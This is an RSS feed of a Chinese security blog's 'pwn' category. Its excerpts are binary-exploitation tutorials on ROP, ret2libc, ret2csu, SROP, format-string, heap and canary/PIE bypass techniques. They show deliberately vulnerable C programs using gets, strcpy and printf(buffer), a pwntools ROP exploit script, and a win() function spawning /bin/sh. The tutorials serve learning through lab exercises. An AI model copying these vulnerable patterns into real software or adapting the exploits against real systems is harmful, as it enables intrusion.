<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>pwn on 诚安</title>
    <link>https://winsun.github.io/fightsec/categories/pwn/</link>
    <description>Recent content in pwn on 诚安</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <lastBuildDate>Sun, 19 Feb 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://winsun.github.io/fightsec/categories/pwn/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ret2csu</title>
      <link>https://winsun.github.io/fightsec/post/pwn_09_ret2csu/</link>
      <pubDate>Sun, 19 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_09_ret2csu/</guid>
      <description>漏洞程序 #include &amp;lt;stdio.h&amp;gt; int win(int x, int y, int z) { if(z == 0xdeadbeefcafed00d) { puts(&amp;quot;Awesome work!&amp;quot;); } } int main() { puts(&amp;quot;Come on then, ret2csu me&amp;quot;); char input[30]; gets(input); return 0; } 利用分析 常规利用 溢出控制rip指向gadget gadget负责执行win 利用代码： from pwn import * elf = context.binary = ELF(&#39;./vuln&#39;) p = process() log.info(f&#39;win addr is : {hex(elf.sym.win)}&#39;) offset = 40 rop = ROP(elf) rop.raw(offset * &#39;a&#39;) rop.win(0,0,0xdeadbeefcafed00d) p.recv() p.sendline(rop.chain()) result = p.recvline() log.info(result) 上述代码基于一个假设存在可以构建gadget的情况，但实际情</description>
    </item>
    
    <item>
      <title>ret2dlresolve</title>
      <link>https://winsun.github.io/fightsec/post/pwn_07_ret2dlresolve/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_07_ret2dlresolve/</guid>
      <description>概要 利用ret2dlresolve，攻击者可以诱导二进制程序解析一个所选择的函数(比如system)为plt。 动态链接的ELF对象在第一次使用PLT和GOT调用时导入libc函数。在重定位runtime symbol，RIP将跳转到PLT并尝试解析该符号。在这个过程中，一个&amp;quo</description>
    </item>
    
    <item>
      <title>socket exploitation</title>
      <link>https://winsun.github.io/fightsec/post/pwn_19_exp_socket/</link>
      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_19_exp_socket/</guid>
      <description>socket vuln #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;netdb.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;arpa/inet.h&amp;gt; void vuln(int childfd) { char buffer[30]; read(childfd, buffer, 500); write(childfd, &amp;quot;Thanks!&amp;quot;, 8); } void win() { system(&amp;quot;/bin/sh&amp;quot;); } ////////////////////// Socket Stuff /* * error - wrapper for perror */ void error(char *msg) { perror(msg); exit(1); } int main(int argc, char **argv) { int parentfd; /* parent socket */ int childfd; /* child socket */ int portno; /* port to listen on */ int clientlen; /* byte size of client&#39;s address */ struct sockaddr_in serveraddr; /* server&#39;s addr */ struct sockaddr_in clientaddr; /* client addr */ struct hostent *hostp; /* client host info */ char *hostaddrp; /* dotted decimal host addr string */ int optval; /* flag value for setsockopt */ int n; /* message byte size */ /* * check</description>
    </item>
    
    <item>
      <title>SROP</title>
      <link>https://winsun.github.io/fightsec/post/pwn_06_srop/</link>
      <pubDate>Sat, 11 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_06_srop/</guid>
      <description>SROP Sigreturn Oriented Programming (SROP), a novel technique for exploits and backdoors in UNIX-like systems. 具体见[1]。 漏洞程序 vuln程序 from pwn import * context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; elf = ELF.from_assembly( &#39;&#39;&#39; mov rdi, 0; mov rsi, rsp; sub rsi, 8; mov rdx, 500; syscall; ret; pop rax; ret; &#39;&#39;&#39;, vma=0x41000 ) elf.save(&#39;vuln&#39;) └─$ cat /usr/include/asm/unistd_64.h | grep -i sigreturn -A2 #define __NR_rt_sigreturn 15 #define __NR_ioctl 16 #define __NR_pread64 17 嵌入shell地址 ┌──(kali㉿kali)-[~/exploits/srop] └─$ echo -en &amp;quot;/bin/sh\x00&amp;quot; &amp;gt;&amp;gt; vuln ┌──(k</description>
    </item>
    
    <item>
      <title>ROP</title>
      <link>https://winsun.github.io/fightsec/post/pwn_02_rop/</link>
      <pubDate>Fri, 10 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_02_rop/</guid>
      <description>ROP Returned-oriented Program,defeats the W⊕X protections recently deployed by Microsoft,Intel, and AMD;in this context, it can be seen as a generalization of traditional return-into-libc attacks. But the threat is more general . gadget what gadget Each gadget is an arrangement of words on the stack, both pointers to instruction sequences and immediate data words, that when invoked accomplishes some well-defined task “W⊕X,” ensures that no memory location in a process image is marked both writable (“W”) and executable (“X”) gadget feature One gadget might: perform a load operation another an xor and another a conditional branch 案例程序 from pwn import * context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; elf = ELF.from_assembly( &#39;&#39;&#39; mov rdi, 0; mov rsi, rsp; sub rsi, 8; mov rdx,</description>
    </item>
    
    <item>
      <title>heap: chunks and bins</title>
      <link>https://winsun.github.io/fightsec/post/pwn_11_heap_chunk_bins/</link>
      <pubDate>Thu, 09 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_11_heap_chunk_bins/</guid>
      <description>chunks 在x86_64上chunk多加16字节的metadata，x86上多加8字节的meatadata metadata := prev size + size + flags(A,M,P) prev size: 前面相邻chunk被free，则代表前chunk大小 size：代表chunk大小 P(0x01): Previous in Use ,表示前面的chunk是否已分配在使用,P == 0,该chunk之前的chun</description>
    </item>
    
    <item>
      <title>ret2libc</title>
      <link>https://winsun.github.io/fightsec/post/pwn_04_ret2libc/</link>
      <pubDate>Fri, 27 Jan 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_04_ret2libc/</guid>
      <description>ret2libc 程序开启nx保护时候，传统的shellcode在栈上不可执行，无法获取 执行shell程序，可以用ret2libc技术。 漏洞程序 #include &amp;lt;stdio.h&amp;gt; void vuln() { char buffer[64]; puts(&amp;quot;Overflow me&amp;quot;); gets(buffer); } int main() { vuln(); } gcc vuln.c -o -m32 -fno-stack-protector -no-pie vuln-32 └─$ checksec --file=./vuln-32 [*] &#39;/home/kali/exploits/ret2libc/vuln-32&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 利用方案 eip直接指向system(&#39;/bin/sh&#39;) 确定</description>
    </item>
    
    <item>
      <title>常用gdb命令</title>
      <link>https://winsun.github.io/fightsec/post/pwn_20_gdb/</link>
      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_20_gdb/</guid>
      <description>参考 100个gdb小技巧 GEF 命令 dive into systems gef manual</description>
    </item>
    
    <item>
      <title>pie绕过</title>
      <link>https://winsun.github.io/fightsec/post/pwn_18_bypass_pie/</link>
      <pubDate>Sun, 20 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_18_bypass_pie/</guid>
      <description>pie PIE（Position Independent Executable，可移植执行码）是一种特殊的执行文件格式，常用于保护程序执行空间的受限和安全性。使用 PIE 能够让加载到内存的代码不会固定地映射到特定的地址，每次加载时都能让其他程序更难预测它想要加载到哪里。 代码重定位的例子有：加载时技术（load-ti</description>
    </item>
    
    <item>
      <title>stack canary泄露方法</title>
      <link>https://winsun.github.io/fightsec/post/pwn_17_stack_canary/</link>
      <pubDate>Sat, 19 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_17_stack_canary/</guid>
      <description>什么是canary security cookies，Assume that at the beginning of a function call (e.g. during its prologue) we are saving a value in the function’s stack frame, we would expect (! if everything went well !) to read the same value just before the function exits or namely at its epilogue. If the value has changed, then the execution of the program will be terminated and an error message will be displayed. [1] Obviously, this protection mechanism is added by the compiler during the compilation process. For the GNU Compiler Collection (gcc), it is implemented via the StackGuard extension which was added to gcc 2.7.2.2 [1] Bypass stack canary 漏洞程</description>
    </item>
    
    <item>
      <title>字符串漏洞：任意写</title>
      <link>https://winsun.github.io/fightsec/post/pwn_16_wformatstr/</link>
      <pubDate>Fri, 18 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_16_wformatstr/</guid>
      <description>vuln.c #include &amp;lt;stdio.h&amp;gt; int auth = 0; int main() { char password[100]; puts(&amp;quot;Password: &amp;quot;); fgets(password, sizeof password, stdin); printf(password); printf(&amp;quot;Auth is %i\n&amp;quot;, auth); if(auth == 10) { puts(&amp;quot;Authenticated!&amp;quot;); } } 程序分析 程序保护 gcc -m32 -no-pie -fno-stack-protector -z execstack vuln.c -o vuln $ checksec --file=./vuln [*] &#39;/home/kali/exploits/str_arb_write/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 栈布局 $ ./vuln Password: %p %p %p %p %p %p %p %p %p %p %p 0x64 0xf7e1d620 0x804918d 0xf7ffdbac 0x1 0xf7fc17c0 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 Auth is 0 ascii hex % 0x25 &amp;quot; &amp;quot; 0x20 p 0x70 第7个dword存放格式化字符串 3. 构建利用栈 栈偏移 栈内容</description>
    </item>
    
    <item>
      <title>unlink exploit</title>
      <link>https://winsun.github.io/fightsec/post/pwn_14_unlinkexp/</link>
      <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_14_unlinkexp/</guid>
      <description></description>
    </item>
    
    <item>
      <title>字符串漏洞: 任意读</title>
      <link>https://winsun.github.io/fightsec/post/pwn_15_formatstr/</link>
      <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_15_formatstr/</guid>
      <description>任意读 vuln.c #include &amp;lt;stdio.h&amp;gt; int main(void) { char buffer[200]; gets(buffer); printf(buffer); return 0; } 漏洞分析 编译程序 gcc -m32 -no-pie -fno-stack-protector -z execstack vuln.c -o vuln 分析程序 程序保护 └─$ checksec --file=./vuln [*] &#39;/home/kali/exploits/str_arb_read/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments r2 debug vuln └─$ r2 -d -A ./vuln glibc.fc_offset = 0x00148 experimental analysis. [0xf7fe4450]&amp;gt; s main;pdf ; DATA XREFS from entry0 @ 0x8049086, 0x804908c ┌ 83: int main (char **argv); │ ; var int32_t var_d0h @ ebp-0xd0 │ ; var int32_t var_8h @ ebp-0x8 │ ; arg char **argv @ esp+0xf4 │ 0x08049172 8d4c2404 sub esp, 0xc │ 0x080491a7 8d8530ffffff lea eax, [var_d0h] │ 0x080491ad 50 push eax │ 0x080491ae</description>
    </item>
    
    <item>
      <title>double free</title>
      <link>https://winsun.github.io/fightsec/post/pwn_13_doublefree/</link>
      <pubDate>Mon, 14 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_13_doublefree/</guid>
      <description></description>
    </item>
    
    <item>
      <title>use after free</title>
      <link>https://winsun.github.io/fightsec/post/pwn_12_uaf/</link>
      <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_12_uaf/</guid>
      <description>配置docker环境 ### pull ubuntu 16.04 image sudo docker pull ubuntu:16.04 ### 进入终端 sudo docker run -ti --rm ubuntu:16.04 /bin/bash ### 安装gcc apt update &amp;amp;&amp;amp; apt install gcc ### gcc 版本 root@687e398bdbdb:/# gcc --version gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609 Copyright (C) 2015 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. ### 安装 radare2 apt install radare2 漏洞程序 #include &amp;lt;err.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; struct data { char name[64]; }; struct fp { void (*fp)(); char __pad[64 - sizeof(unsigned long)]; }; void winner() { printf(&amp;quot;Congratulations, you have passed this level\n&amp;quot;); } void nowinner() { printf( &amp;quot;level has</description>
    </item>
    
    <item>
      <title>stack pivoiting</title>
      <link>https://winsun.github.io/fightsec/post/pwn_10_stack_pivoiting/</link>
      <pubDate>Sat, 29 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_10_stack_pivoiting/</guid>
      <description>1 what stack pivoiting是一种栈空间转移技术 2 why 有时候缓冲区有长度限制，不利于在栈上配置rop gadget(空间不够)！ 3 how 3.1 pop rsp gadget 这种情形比较少见，遇到了相当幸运～ 3.2 xchg , rsp pop &amp;lt;reg&amp;gt; &amp;lt;=== return pointer &amp;lt;reg value&amp;gt; xchg &amp;lt;rag&amp;gt;, rsp 3.3 leave;ret leave相当于： mov rsp,rbp pop rbp 加上ret就等于： mov rsp,rbp pop rbp pop rip 覆盖rbp，然后栈中的ri</description>
    </item>
    
    <item>
      <title>ret2reg</title>
      <link>https://winsun.github.io/fightsec/post/pwn_08_ret2reg/</link>
      <pubDate>Wed, 19 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_08_ret2reg/</guid>
      <description></description>
    </item>
    
    <item>
      <title>ret2plt</title>
      <link>https://winsun.github.io/fightsec/post/pwn_05_ret2plt/</link>
      <pubDate>Tue, 04 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_05_ret2plt/</guid>
      <description>PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.) 漏洞程序 #include &amp;lt;stdio.h&amp;gt; void vuln() { puts(&amp;quot;Come get me&amp;quot;); char buffer[20]; gets(buffer); } int main() { vuln(); return 0; } 32位ret2plt plt分析 程序保护 //gcc source.c -o vuln-32 -no-pie -fno-stack-protector -z execstack -m32 └─$ checksec --file=./vuln-32 [*] &#39;/home/kali/exploits/ret2plt/vuln-32&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) plt节 .plt节可执行 [0xf7fe4450]&amp;gt; iS~.plt 10 0x000002f0 0x18 0x080482f0 0x18</description>
    </item>
    
    <item>
      <title>利用got覆盖执行shellcode</title>
      <link>https://winsun.github.io/fightsec/post/pwn_03_got_overwrite/</link>
      <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_03_got_overwrite/</guid>
      <description>漏洞程序 // gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32 #include &amp;lt;stdio.h&amp;gt; void vuln() { char buffer[20]; puts(&amp;quot;Give me the input&amp;quot;); gets(buffer); } int main() { vuln(); return 0; }</description>
    </item>
    
    <item>
      <title>pwntools基本用法</title>
      <link>https://winsun.github.io/fightsec/post/pwn_01_pwntools/</link>
      <pubDate>Mon, 19 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_01_pwntools/</guid>
      <description>elf process remote rop 参考 pwntools github pwntools doc Writing Exploits with pwntools</description>
    </item>
    
    <item>
      <title>缓冲区溢出01-溢出漏洞</title>
      <link>https://winsun.github.io/fightsec/post/pwn_21_overflow01/</link>
      <pubDate>Tue, 09 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_21_overflow01/</guid>
      <description>缓冲区溢出 一个自带缓冲区溢出bug的代码 greeting函数存在buffer overflow $ gdb -q meet warning: ~/gef/gef.py: No such file or directory warning: ~/gef/scripts/helpme.py: No such file or directory Reading symbols from meet... (gdb) list 1 // meet.c 2 #include &amp;lt;stdio.h&amp;gt; // needed for screen printing 3 #include &amp;lt;string.h&amp;gt; // needed for strcpy 4 void greeting(char *temp1,char *temp2){ // greeting function to say hello 5 char name[400]; // string variable to hold the name 6 strcpy(name, temp2); // copy argument to name with the infamous strcpy 7 printf(&amp;quot;Hello %s %s\n&amp;quot;, temp1, name); // print out the greeting 8 } 9 int main(int argc, char * argv[]){ // note the format for arguments</description>
    </item>
    
    <item>
      <title>缓冲区溢出02-shellcode</title>
      <link>https://winsun.github.io/fightsec/post/pwn_22_overflow02/</link>
      <pubDate>Tue, 09 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_22_overflow02/</guid>
      <description>weekness programe // meet.c #include &amp;lt;stdio.h&amp;gt; // needed for screen printing #include &amp;lt;string.h&amp;gt; // needed for strcpy void greeting(char *temp1,char *temp2){ // greeting function to say hello char name[400]; // string variable to hold the name strcpy(name, temp2); // copy argument to name with the infamous strcpy printf(&amp;quot;Hello %s %s\n&amp;quot;, temp1, name); // print out the greeting } int main(int argc, char * argv[]){ // note the format for arguments greeting(argv[1], argv[2]); // call function, pass title &amp;amp; name printf(&amp;quot;Bye %s %s\n&amp;quot;, argv[1], argv[2]); // say &amp;quot;bye&amp;quot; } // exit program stack frame | name[400] | ebp | eip | temp1 | temp2 | disassemble greeting (gdb) disass greeting Dump of assembler code for function greeting: 0x56556201 &amp;lt;+0&amp;gt;: push %ebp 0x56556202 &amp;lt;+1&amp;gt;: mov %esp,%ebp 0x56556204 &amp;lt;+3&amp;gt;: push %ebx 0x56556205 &amp;lt;+4&amp;gt;: sub $0x190,%esp 0x5655620b &amp;lt;+10&amp;gt;: call 0x565560c0 &amp;lt;__x86.get_pc_thunk.bx&amp;gt; 0x56556210 &amp;lt;+15&amp;gt;: add</description>
    </item>
    
    <item>
      <title>Linux Kernel Exploitation Technique: Overwriting: modprobe_path</title>
      <link>https://winsun.github.io/fightsec/post/pwn_23_exp_kernel/</link>
      <pubDate>Fri, 12 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_23_exp_kernel/</guid>
      <description>引用 Overwriting modprobe_path Linux Kernel Exploitation</description>
    </item>
    
    <item>
      <title>虚拟化研究框架</title>
      <link>https://winsun.github.io/fightsec/post/pwn_24_hypervisor/</link>
      <pubDate>Fri, 12 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_24_hypervisor/</guid>
      <description>kali install kvm kali install kvm</description>
    </item>
    
  </channel>
</rss>
